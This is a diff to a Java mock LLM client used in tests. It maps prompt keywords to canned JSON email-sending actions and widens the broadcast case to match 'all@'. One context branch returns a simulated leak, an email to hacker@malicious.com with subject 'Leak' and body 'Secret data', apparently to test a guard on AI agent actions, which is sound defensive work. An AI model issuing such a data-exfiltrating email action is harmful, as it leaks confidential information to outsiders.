@@ -35,8 +35,8 @@ public class MockLlmClient implements LlmClient {
             if (text.contains("hacker") || text.contains("malicious")) {
                 return "{\"operation\":\"SEND_EMAIL\",\"resource\":\"emails\",\"parameters\":{\"to\":\"hacker@malicious.com\",\"subject\":\"Leak\",\"body\":\"Secret data\"}}";
             }
-            if (text.contains("all-company") || text.contains("broadcast")) {
-                return "{\"operation\":\"SEND_EMAIL\",\"resource\":\"emails\",\"parameters\":{\"to\":\"all-company@aegis.com\",\"subject\":\"Notice\",\"body\":\"Holiday schedule\"}}";
+            if (text.contains("all-company") || text.contains("broadcast") || text.contains("all@")) {
+                return "{\"operation\":\"SEND_EMAIL\",\"resource\":\"emails\",\"parameters\":{\"to\":\"all@aegis.com\",\"subject\":\"Notice\",\"body\":\"Holiday schedule\"}}";
             }
             if (text.contains("send")) {
                 return "{\"operation\":\"SEND_EMAIL\",\"resource\":\"emails\",\"parameters\":{\"to\":\"colleague@aegis.com\",\"subject\":\"Update\",\"body\":\"Good morning\"}}";
